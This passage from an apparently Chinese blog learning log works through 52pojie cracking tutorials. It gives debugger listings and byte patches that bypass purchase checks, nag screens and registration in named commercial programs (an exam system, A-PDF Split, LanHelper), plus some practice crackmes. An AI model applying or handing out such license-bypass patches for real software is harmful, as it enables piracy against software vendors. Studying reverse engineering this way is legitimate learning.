|.  8D34FD 246B4C&gt;lea esi,dword ptr ds:[edi*8+0x4C6B24]                    ;  R6002\r\n- floating point support not loaded\r\n</span><br><span class="line">0047BC71  |.  FF36          push dword ptr ds:[esi]</span><br><span class="line">0047BC73  |.  E8 982A0000   call ESIExamP.0047E710</span><br><span class="line">0047BC78  |.  59            pop ecx                                                  ; |ESIExamP.004754A8</span><br><span class="line">0047BC79  |.  50            push eax                                                 ; |nBytesToWrite = 0x0</span><br><span class="line">0047BC7A  |.  FF36          push dword ptr ds:[esi]                                  ; |Buffer = NULL</span><br><span class="line">0047BC7C  |.  53            push ebx                                                 ; |hFile = 00124EFC</span><br><span class="line">0047BC7D  |.  FF15 4CB34900 call dword ptr ds:[&lt;&amp;kernel32.#WritePrivateProfileString&gt;; \WriteFile</span><br><span class="line">0047BC83  |&gt;  5F            pop edi                                                  ;  ESIExamP.004754A8</span><br><span class="line">0047BC84  |.  5E            pop esi                                                  ;  ESIExamP.004754A8</span><br><span class="line">0047BC85  |.  5B            pop ebx                                                  ;  ESIExamP.004754A8</span><br><span class="line">0047BC86  |.  C9            leave</span><br><span class="line">0047BC87  \.  C3            retn</span><br></pre></td></tr></table></figure><p>将<code>.MPRESS1</code>区段改为不可写显然不现实，因为程序不止这一处是写入的，那就只能强制初始化。载入IDA查看<code>__cinit</code>函数，发现它有<code>__IsNonwritableInCurrentImage</code>函数，用来判断地址是否可写，不能写则调用<code>__fpmath</code>(call off_4A11A8)进行初始化。 </p><img src="/posts/f398dcca/4.7.4.png" class="" title="浮点数错误"><p>回到OD修改<code>475561</code>和<code>475570</code>地址的<code>jz</code>指令改为<code>nop</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">00475561     /74 19         je short ESIExamP.0047557C;nop掉</span><br><span class="line">00475570     /74 0A         je short ESIExamP.0047557C;nop掉</span><br></pre></td></tr></table></figure><p>习题集、统计曲线等等都可以正常打开了。</p><p>接着爆破。最终目的是能bp试卷，所以找到两处购买试题的地方，可知标志位保存在<code>ebx+0x15C</code>中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0043032E   &gt; \83BB 5C010000&gt;cmp dword ptr ds:[ebx+0x15C],0x0</span><br><span class="line">00430335   .  0F85 A5000000 jnz ESIExamP.004303E0</span><br><span class="line">0043033B   .  8D8B CC050000 lea ecx,dword ptr ds:[ebx+0x5CC]</span><br><span class="line">00430341   .  51            push ecx</span><br><span class="line">00430342   .  8D95 B0F8FFFF lea edx,dword ptr ss:[ebp-0x750]</span><br><span class="line">00430348   .  68 78CB4A00   push ESIExamP.004ACB78                   ;  &amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;a href=</span><br><span class="line">0043034D   .  52            push edx                                 ;  ntdll.KiFastSystemCallRet</span><br><span class="line">0043034E   .  E8 3D56FDFF   call ESIExamP.00405990</span><br><span class="line">00430353   .  83C4 0C       add esp,0xC</span><br><span class="line">00430356   .  68 28CB4A00   push ESIExamP.004ACB28                   ;  &gt;&lt;font color=red&gt;未购买该试题 点击购买&lt;/font&gt;&lt;/a&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">00430B14   .  83BB 5C010000&gt;cmp dword ptr ds:[ebx+0x15C],0x0</span><br><span class="line">00430B1B   .  0F85 9C000000 jnz ESIExamP.00430BBD</span><br><span class="line">00430B21   .  8D8B CC050000 lea ecx,dword ptr ds:[ebx+0x5CC]</span><br><span class="line">00430B27   .  51            push ecx</span><br><span class="line">00430B28   .  8D95 90F8FFFF lea edx,dword ptr ss:[ebp-0x770]</span><br><span class="line">00430B2E   .  68 C4CC4A00   push ESIExamP.004ACCC4                   ;  &lt;a href=</span><br><span class="line">00430B33   .  52            push edx                                 ;  ntdll.KiFastSystemCallRet</span><br><span class="line">00430B34   .  E8 574EFDFF   call ESIExamP.00405990</span><br><span class="line">00430B39   .  83C4 0C       add esp,0xC</span><br><span class="line">00430B3C   .  68 28CB4A00   push ESIExamP.004ACB28                   ;  &gt;&lt;font color=red&gt;未购买该试题 点击购买&lt;/font&gt;&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>修改方法有两种：</p><ol><li>查找参考-&gt;地址常量，找到所有<code>cmp dword ptr ds:[ecx+0x15C],0x0</code>，修改其下面的跳转指令；</li><li>查找参考-&gt;地址常量，找到所有给[ebx+0x15C]赋值的地方，修改其赋值。</li></ol><p>选择哪一个比较好视工作量而定，肯定是哪个修改量少修改哪个。</p><p>我觉得在这程序里第一种方法工作量比较小。修改完后已经没有“购买试题”的字样了，但NAG窗口还在。搜索字符串先将这里修改了，试题我都bp了，怎么能说我没注册呢！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0043E6A2     /74 66         je short ESIExamP.0043E70A               ;  nop掉</span><br><span class="line">0043E6A4   . |68 8CF04A00   push ESIExamP.004AF08C                   ;  您已获得本套系统正版授权，谢谢您的支持！</span><br><span class="line">0043E6A9   . |68 24040000   push 0x424</span><br><span class="line">0043E6AE   . |8BCD          mov ecx,ebp</span><br><span class="line">0043E6B0   . |E8 A2270100   call ESIExamP.00450E57</span><br><span class="line">0043E6B5   . |8BC8          mov ecx,eax</span><br><span class="line">0043E6B7   . |E8 DB280100   call ESIExamP.00450F97</span><br><span class="line">0043E6BC   . |68 B8F04A00   push ESIExamP.004AF0B8                   ;  系统已经注册</span><br><span class="line">0043E6C1   . |6A 01         push 0x1</span><br></pre></td></tr></table></figure><p>接着去掉NAG窗口。在命令窗口下断<code>bp CreateDialogIndirectParamW</code>(CreateDialogIndirectParam是用于从内存中的对话框模板上创建一个无模式对话框的函数)。第一次F9运行至断点处，第二次F9出现主程序，第三次F9出现NAG。所以要在第二次F9到第三次F9之间找到绕过NAG窗口的指令。</p><p>在第二次F9后，一路F8，运行到这一句时弹出NAG窗口。(这里前面有个可以绕过<code>call</code>指令的跳转指令，但是不能将它改为<code>jmp</code>，因为你会发现这个<code>call</code>指令被运行了两次，第一次是主程序，第二次才是NAG)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">00452936     /74 1E         je short ESIExamP.00452956</span><br><span class="line">00452938   . |6A 04         push 0x4</span><br><span class="line">0045293A   . |5F            pop edi</span><br><span class="line">0045293B   . |8BCE          mov ecx,esi</span><br><span class="line">0045293D   . |E8 C9E5FFFF   call ESIExamP.00450F0B</span><br><span class="line">00452942   . |A9 00010000   test eax,0x100</span><br><span class="line">00452947   . |74 03         je short ESIExamP.0045294C</span><br><span class="line">00452949   . |6A 05         push 0x5</span><br><span class="line">0045294B   . |5F            pop edi</span><br><span class="line">0045294C   &gt; |57            push edi</span><br><span class="line">0045294D   . |8BCE          mov ecx,esi</span><br><span class="line">0045294F   . |E8 B8270000   call ESIExamP.0045510C                   ;  第一次主程序，第二次NAG窗口</span><br><span class="line">00452954   . |33FF          xor edi,edi</span><br><span class="line">00452956   &gt; \397E 20       cmp dword ptr ds:[esi+0x20],edi     </span><br></pre></td></tr></table></figure><p>在堆栈窗口找到这句反汇编窗口跟随。(主程序与NAG“返回到”的地址不同)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00124ED0   0043835E  返回到 ESIExamP.0043835E 来自 ESIExamP.00452827</span><br></pre></td></tr></table></figure><p>将<code>jnz</code>修改为<code>jmp</code>指令绕过NAG窗口。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">00438341   . /75 2A         jnz short ESIExamP.0043836D;jmp</span><br><span class="line">00438343   . |8D8D E4F9FFFF lea ecx,dword ptr ss:[ebp-0x61C]</span><br><span class="line">00438349   . |51            push ecx</span><br><span class="line">0043834A   . |E8 4122FEFF   call ESIExamP.0041A590</span><br><span class="line">0043834F   . |8D8D E4F9FFFF lea ecx,dword ptr ss:[ebp-0x61C]</span><br><span class="line">00438355   . |C645 FC 27    mov byte ptr ss:[ebp-0x4],0x27</span><br><span class="line">00438359   . |E8 C9A40100   call ESIExamP.00452827                                ;  NAG</span><br><span class="line">0043835E   . |8D95 E4F9FFFF lea edx,dword ptr ss:[ebp-0x61C]</span><br><span class="line">00438364   . |52            push edx</span><br><span class="line">00438365   . |885D FC       mov byte ptr ss:[ebp-0x4],bl</span><br><span class="line">00438368   . |E8 2323FEFF   call ESIExamP.0041A690</span><br><span class="line">0043836D   &gt; \8D4D E8       lea ecx,dword ptr ss:[ebp-0x18]</span><br></pre></td></tr></table></figure><h2 id="第八战：A-PDF-Split-已下载"><a href="#第八战：A-PDF-Split-已下载" class="headerlink" title="第八战：A-PDF Split(已下载)"></a>第八战：A-PDF Split(已下载)</h2><p><a href="https://www.52pojie.cn/thread-199834-1-1.html">https://www.52pojie.cn/thread-199834-1-1.html</a></p><p>ASProtect1.23 RC1+14处自校验+跳转爆破</p><p>发现不会手脱，那就用脱壳工具中的ASProtect Unpacker 汉化版脱壳。是用Delphi写的程序。</p><p>载入OD，下<code>bp MessageBoxA</code>和<code>bp MessageBoxW</code>断点，运行，点击试用卡在了kernel32模块的某个地方。F8走出来，回到用户代码处。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0040B285      E8 8692FFFF   call PdfSplit.00404510</span><br><span class="line">0040B28A  |.  5F            pop edi                                            ;  PdfSplit.0040B28A</span><br><span class="line">0040B28B  |.  5E            pop esi                                            ;  PdfSplit.0040B28A</span><br></pre></td></tr></table></figure><p>发现应该是<code>40B285</code>地址的call指令产生的错误，直接把它NOP掉。保存，运行发现程序直接退出了。程序退出调用的是<code>PostQuitMessage</code>函数，下这个断点。点击“Try”，程序停在断点处。堆栈查看返回函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0012FD88   0048BDBC  /CALL 到 PostQuitMessage 来自 PdfSplit.0048BDB7</span><br><span class="line">0012FD8C   00000000  \ExitCode = 0x0</span><br><span class="line">0012FD90   00576B5B  返回到 PdfSplit.00576B5B 来自 PdfSplit.0048BDAC</span><br><span class="line">0012FD94   0012FDEC  指向下一个 SEH 记录的指针</span><br><span class="line">0012FD98   0057705E  SE处理程序</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0048BDB3  |. /74 07         je short PdfSplit.0048BDBC;要跳</span><br><span class="line">0048BDB5  |. |6A 00         push 0x0                                 ; /ExitCode = 0x0</span><br><span class="line">0048BDB7  |. |E8 18BDF7FF   call &lt;jmp.&amp;user32.PostQuitMessage&gt;       ; \PostQuitMessage</span><br><span class="line">0048BDBC  \&gt; \C3            retn</span><br></pre></td></tr></table></figure><p><code>je</code>修改为<code>jmp</code>。保存。运行程序发现点击“Try”能进入主程序了，也没有错误框。但点击“Browse”又弹出错误框。</p><img src="/posts/f398dcca/8.2.png" class="" title="弹出错误"><p>点击关闭还关闭不了了。</p><img src="/posts/f398dcca/8.2.png" class="" title="无效指针"><p>…好难，脱壳好像引发别的错误了…</p><h2 id="第九战：XXPDF转WORD助手"><a href="#第九战：XXPDF转WORD助手" class="headerlink" title="第九战：XXPDF转WORD助手"></a>第九战：XXPDF转WORD助手</h2><p><a href="https://www.52pojie.cn/thread-200655-1-1.html">https://www.52pojie.cn/thread-200655-1-1.html</a></p><p>tElock壳+自校验+爆破</p><h2 id="第十战：LanHelper算法分析与注册机的编写"><a href="#第十战：LanHelper算法分析与注册机的编写" class="headerlink" title="第十战：LanHelper算法分析与注册机的编写"></a>第十战：LanHelper算法分析与注册机的编写</h2><p><a href="https://www.52pojie.cn/thread-200798-1-1.html">https://www.52pojie.cn/thread-200798-1-1.html</a></p><p>算法分析</p><img src="/posts/f398dcca/10.1.png" class="" title="注册码有误"><p>拿去查壳，没有壳，是Delphi写的程序。载入OD搜索字符串“注册码”没有找到。没关系，谁让它是Delphi写的呢？把它载入Delphi Decompiler，点击“Procedures”(过程)，找到有关注册字样的单元名。注册的窗体有两个文本框和三个按钮，找到最符合的注册窗体。</p><img src="/posts/f398dcca/10.2.png" class="" title="dede找注册窗体"><p>猜测<code>Button1Click</code>是“确定”按钮，因为“取消”就会返回到父窗口，相当于关闭嘛，没有按钮可以理解。为了验证我们的猜想，双击<code>Button1Click</code>进去找到第一条汇编指令，地址为<code>004DCB40</code>。</p><img src="/posts/f398dcca/10.3.png" class="" title="按钮首地址"><p>回到OD，Ctrl + G输入地址，下断运行。输入名称、注册码后点击确定，OD成功停在断点处，说明找对了。</p><p>F8往下运行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">004DCB6D   .  E8 5616FAFF   call LanHelpe.0047E1C8</span><br><span class="line">004DCB72   .  8B45 B8       mov eax,dword ptr ss:[ebp-0x48]</span><br><span class="line">004DCB75   .  8D55 BC       lea edx,dword ptr ss:[ebp-0x44]</span><br><span class="line">004DCB78   .  E8 47CCF2FF   call LanHelpe.004097C4                   ;  获取用户名</span><br><span class="line">004DCB7D   .  837D BC 00    cmp dword ptr ss:[ebp-0x44],0x0          ;  判断用户名是否为空</span><br><span class="line">004DCB81   .  74 22         je short LanHelpe.004DCBA5</span><br><span class="line">004DCB83   .  8D55 B0       lea edx,dword ptr ss:[ebp-0x50]</span><br><span class="line">004DCB86   .  8B45 FC       mov eax,dword ptr ss:[ebp-0x4]</span><br><span class="line">004DCB89   .  8B80 04030000 mov eax,dword ptr ds:[eax+0x304]</span><br><span class="line">004DCB8F   .  E8 3416FAFF   call LanHelpe.0047E1C8</span><br><span class="line">004DCB94   .  8B45 B0       mov eax,dword ptr ss:[ebp-0x50]</span><br><span class="line">004DCB97   .  8D55 B4       lea edx,dword ptr ss:[ebp-0x4C]</span><br><span class="line">004DCB9A   .  E8 25CCF2FF   call LanHelpe.004097C4                   ;  获取假码</span><br><span class="line">004DCB9F   .  837D B4 00    cmp dword ptr ss:[ebp-0x4C],0x0          ;  判断假码是否为空</span><br><span class="line">004DCBA3   .  75 44         jnz short LanHelpe.004DCBE9</span><br><span class="line">004DCBA5   &gt;  8D4D F0       lea ecx,dword ptr ss:[ebp-0x10]</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">004DCBE9   &gt; \8D55 A8       lea edx,dword ptr ss:[ebp-0x58]</span><br><span class="line">004DCBEC   .  8B45 FC       mov eax,dword ptr ss:[ebp-0x4]</span><br><span class="line">004DCBEF   .  8B80 04030000 mov eax,dword ptr ds:[eax+0x304]</span><br><span class="line">004DCBF5   .  E8 CE15FAFF   call LanHelpe.0047E1C8</span><br><span class="line">004DCBFA   .  8B45 A8       mov eax,dword ptr ss:[ebp-0x58]</span><br><span class="line">004DCBFD   .  50            push eax</span><br><span class="line">004DCBFE   .  8D55 A4       lea edx,dword ptr ss:[ebp-0x5C]</span><br><span class="line">004DCC01   .  8B45 FC       mov eax,dword ptr ss:[ebp-0x4]</span><br><span class="line">004DCC04   .  8B80 00030000 mov eax,dword ptr ds:[eax+0x300]</span><br><span class="line">004DCC0A   .  E8 B915FAFF   call LanHelpe.0047E1C8</span><br><span class="line">004DCC0F   .  8B45 A4       mov eax,dword ptr ss:[ebp-0x5C]</span><br><span class="line">004DCC12   .  5A            pop edx                                  ;  0012F338</span><br><span class="line">004DCC13   .  E8 9C270000   call LanHelpe.004DF3B4                   ;  用户名和假码放到寄存器，这个是关键call</span><br><span class="line">004DCC18      84C0          test al,al                               ;  比较al的值</span><br><span class="line">004DCC1A      0F84 F4030000 je LanHelpe.004DD014                     ;  关键跳</span><br></pre></td></tr></table></figure><p>运行到关键跳处修改Z标志位，F9运行，发现成功注册，但程序是重启验证类型的。</p><img src="/posts/f398dcca/10.4.png" class="" title="注册成功"><p>那我们将关键跳nop掉作为2.exe，修改al的值作为3.exe试试。</p><p>意料之中，2.exe每次都需要注册，根本就行不通。3.exe竟然说注册码有误，我们不是跳过了吗？载入OD发现al确实是变成1，但是je跳转还是实现了。好吧既然这样就进入关键call一探究竟。</p><p>输入用户名v5le0n9，假码l30n9ry0n。进入关键call。</p><img src="/posts/f398dcca/10.5.png" class="" title="算法分析"><img src="/posts/f398dcca/10.6.png" class="" title="算法分析"><img src="/posts/f398dcca/10.7.png" class="" title="算法分析"><p>将这循环跑了6次之后，可以知道真码前6位固定为LH4A8N。循环结束后，比较dl的值，如果dl为0则跳转到eax清零处。</p><p>重新载入，将假码的前6位设置为<code>LH4A8N</code>再分析。去到比较dl的值处，现在已经不为0了。继续往下走，看到一些红色指令。</p><p>fild和fstp都是x86指令，fild是将整数转化为长双精FP80压栈(压到st0)，<br>fstp是将弹栈指令，将st0弹出。ebp始终指向栈顶，ebp是在堆栈中寻址用的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">004DF49C   .  84D2             test dl,dl</span><br><span class="line">004DF49E   .  0F84 F8030000    je LanHelpe.004DF89C</span><br><span class="line">004DF4A4   .  33C0             xor eax,eax</span><br><span class="line">004DF4A6   .  8945 E0          mov dword ptr ss:[ebp-0x20],eax</span><br><span class="line">004DF4A9   .  8945 E4          mov dword ptr ss:[ebp-0x1C],eax</span><br><span class="line">004DF4AC   .  8B45 F8          mov eax,dword ptr ss:[ebp-0x8]           ;  eax是假码</span><br><span class="line">004DF4AF   .  8A58 06          mov bl,byte ptr ds:[eax+0x6]             ;  将第7位赋值给bl</span><br><span class="line">004DF4B2   .  33C0             xor eax,eax                              ;  eax清零</span><br><span class="line">004DF4B4   .  8AC3             mov al,bl                                ;  bl再赋值给al</span><br><span class="line">004DF4B6   .  8945 A0          mov dword ptr ss:[ebp-0x60],eax          ;  将假码第7位压入[ebp-0x60]</span><br><span class="line">004DF4B9   .  DB45 A0          fild dword ptr ss:[ebp-0x60]             ;  将第7位放入st0中</span><br><span class="line">004DF4BC   .  83C4 F4          add esp,-0xC                             ;  更新栈顶指针</span><br><span class="line">004DF4BF   .  DB3C24           fstp tbyte ptr ss:[esp]                  ;  pop栈顶数据</span><br><span class="line">004DF4C2   .  9B               wait</span><br><span class="line">004DF4C3   .  68 FE3F0000      push 0x3FFE</span><br><span class="line">004DF4C8   .  68 BD529691      push 0x919652BD</span><br><span class="line">004DF4CD   .  68 3411363C      push 0x3C361134</span><br><span class="line">004DF4D2   .  E8 9D1AF5FF      call LanHelpe.00430F74                   ;  将上面3个参数入栈调用F74</span><br></pre></td></tr></table></figure><p>后面也有很多调用F74的，所以进去F74分析一下。</p><img src="/posts/f398dcca/10.8.png" class="" title="算法分析"><img src="/posts/f398dcca/10.9.png" class="" title="算法分析"><p>…又要进去BF4分析一下，我真看不懂啊救命</p><h1 id="NO-5-NET系列教程"><a href="#NO-5-NET系列教程" class="headerlink" title="NO.5 .NET系列教程"></a>NO.5 .NET系列教程</h1><p>Blue的实战软件全都过期了，所以我找了别的教程自力更生。</p><p><a href="https://v5le0n9.github.io/posts/784f7e1d.html">.Net零基础破解教程</a></p><h1 id="NO-6-去软件弹窗系列教程"><a href="#NO-6-去软件弹窗系列教程" class="headerlink" title="NO.6 去软件弹窗系列教程"></a>NO.6 去软件弹窗系列教程</h1><h2 id="第一课：弹窗暗桩"><a href="#第一课：弹窗暗桩" class="headerlink" title="第一课：弹窗暗桩"></a>第一课：弹窗暗桩</h2><p>运行一下程序，弹出网页。程序无壳，查找一下字符串，定位关键代码处。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">00401004  /.  55            push ebp</span><br><span class="line">00401005  |.  8BEC          mov ebp,esp</span><br><span class="line">00401007  |.  6A 00         push 0x0</span><br><span class="line">00401009  |.  68 106B4600   push 第一课.00466B10                        ;  恭喜你：暗桩没有触发</span><br><span class="line">0040100E  |.  6A FF         push -0x1</span><br><span class="line">00401010  |.  6A 08         push 0x8</span><br><span class="line">00401012  |.  68 04000116   push 0x16010004</span><br><span class="line">00401017  |.  68 01000152   push 0x52010001</span><br><span class="line">0040101C  |.  E8 A0000000   call 第一课.004010C1</span><br><span class="line">00401021  |.  83C4 18       add esp,0x18</span><br><span class="line">00401024  |.  E8 04000000   call 第一课.0040102D;暗桩关键call，nop即可</span><br><span class="line">00401029  |.  8BE5          mov esp,ebp</span><br><span class="line">0040102B  |.  5D            pop ebp                                  ;  kernel32.7C817077</span><br><span class="line">0040102C  \.  C3            retn</span><br><span class="line">0040102D  /$  55            push ebp</span><br><span class="line">0040102E  |.  8BEC          mov ebp,esp</span><br><span class="line">00401030  |.  68 04000080   push 0x80000004</span><br><span class="line">00401035  |.  6A 00         push 0x0</span><br><span class="line">00401037  |.  68 256B4600   push 第一课.00466B25                        ;  www.52pojie.cn</span><br><span class="line">0040103C  |.  68 01000000   push 0x1</span><br><span class="line">00401041  |.  B8 01000000   mov eax,0x1</span><br><span class="line">00401046  |.  BB 10584400   mov ebx,第一课.00445810</span><br><span class="line">0040104B  |.  E8 77000000   call 第一课.004010C7</span><br><span class="line">00401050  |.  83C4 10       add esp,0x10</span><br><span class="line">00401053  |.  6A 00         push 0x0</span><br><span class="line">00401055  |.  68 346B4600   push 第一课.00466B34                        ;  失败了！暗桩已经触发</span><br></pre></td></tr></table></figure><h2 id="第二课：再探弹窗暗桩"><a href="#第二课：再探弹窗暗桩" class="headerlink" title="第二课：再探弹窗暗桩"></a>第二课：再探弹窗暗桩</h2><p>这次是两个弹网页。依旧无壳，载入OD，发现查找字符串无果。查找所有模块间的调用，找到弹网页的函数<code>ShellExecuteA</code>，下断。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">00445DD0  /$  68 F8114800   push 第二课.004811F8                        ; /Microsoft Internet Explorer</span><br><span class="line">00445DD5  |.  6A 00         push 0x0                                 ; |Class = 0x0</span><br><span class="line">00445DD7  |.  6A 00         push 0x0                                 ; |hAfterWnd = NULL</span><br><span class="line">00445DD9  |.  6A 00         push 0x0                                 ; |hParent = NULL</span><br><span class="line">00445DDB  |.  FF15 40654600 call dword ptr ds:[&lt;&amp;USER32.FindWindowEx&gt;; \FindWindowExA</span><br><span class="line">00445DE1  |.  8B4C24 04     mov ecx,dword ptr ss:[esp+0x4]</span><br><span class="line">00445DE5  |.  6A 01         push 0x1                                 ; /IsShown = 0x1</span><br><span class="line">00445DE7  |.  6A 00         push 0x0                                 ; |DefDir = NULL</span><br><span class="line">00445DE9  |.  6A 00         push 0x0                                 ; |Parameters = NULL</span><br><span class="line">00445DEB  |.  51            push ecx                                 ; |FileName = &quot;&quot;</span><br><span class="line">00445DEC  |.  68 F0114800   push 第二课.004811F0                        ; |open</span><br><span class="line">00445DF1  |.  50            push eax                                 ; |hWnd = 001631B8</span><br><span class="line">00445DF2  |.  FF15 84634600 call dword ptr ds:[&lt;&amp;SHELL32.ShellExecut&gt;; \ShellExecuteA</span><br><span class="line">00445DF8  \.  C2 0400       retn 0x4</span><br></pre></td></tr></table></figure><p>执行到返回，程序弹出一个网页。再经过这里一次，程序弹出第二个网页。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00445CD5   .  E8 3A150100   call 第二课.00457214</span><br><span class="line">00445CDA      8B4424 00     mov eax,dword ptr ss:[esp]</span><br><span class="line">00445CDE      8D4C24 04     lea ecx,dword ptr ss:[esp+0x4]</span><br><span class="line">00445CE2      50            push eax</span><br><span class="line">00445CE3      E8 E8000000   call 第二课.00445DD0                        ;  暗桩</span><br><span class="line">00445CE8   .  8D4C24 00     lea ecx,dword ptr ss:[esp]</span><br></pre></td></tr></table></figure><p>所以只要将2-5行代码都nop掉，两个弹窗都没有了。但运行程序还是说暗桩已经触发。那有没有好一点的办法让它说没有触发呢？</p><p>在数据窗口Ctrl+B搜索ASCII码“ www.52pojie.cn ”，下内存访问断点。运行单步</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">004010C4  /$  55            push ebp</span><br><span class="line">004010C5  |.  8BEC          mov ebp,esp</span><br><span class="line">004010C7  |.  81EC 04000000 sub esp,0x4</span><br><span class="line">004010CD  |.  68 010100A0   push 0xA0000101</span><br><span class="line">004010D2  |.  6A 00         push 0x0</span><br><span class="line">004010D4  |.  68 F87B4600   push 第二课.00467BF8</span><br><span class="line">004010D9  |.  68 01000000   push 0x1</span><br><span class="line">004010DE  |.  BB 10144000   mov ebx,第二课.00401410</span><br><span class="line">004010E3  |.  E8 B4010000   call 第二课.0040129C</span><br><span class="line">004010E8  |.  83C4 10       add esp,0x10</span><br><span class="line">004010EB  |.  8945 FC       mov [local.1],eax</span><br><span class="line">004010EE  |.  68 04000080   push 0x80000004</span><br><span class="line">004010F3  |.  6A 00         push 0x0</span><br><span class="line">004010F5  |.  8B45 FC       mov eax,[local.1]</span><br><span class="line">004010F8  |.  85C0          test eax,eax</span><br><span class="line">004010FA  |.  75 05         jnz short 第二课.00401101</span><br><span class="line">004010FC  |.  B8 0E7C4600   mov eax,第二课.00467C0E                     ;  ā</span><br><span class="line">00401101  |&gt;  50            push eax</span><br><span class="line">00401102  |.  68 01000000   push 0x1</span><br><span class="line">00401107  |.  B8 01000000   mov eax,0x1</span><br><span class="line">0040110C  |.  BB B05C4400   mov ebx,第二课.00445CB0</span><br><span class="line">00401111  |.  E8 8C010000   call 第二课.004012A2                        ;  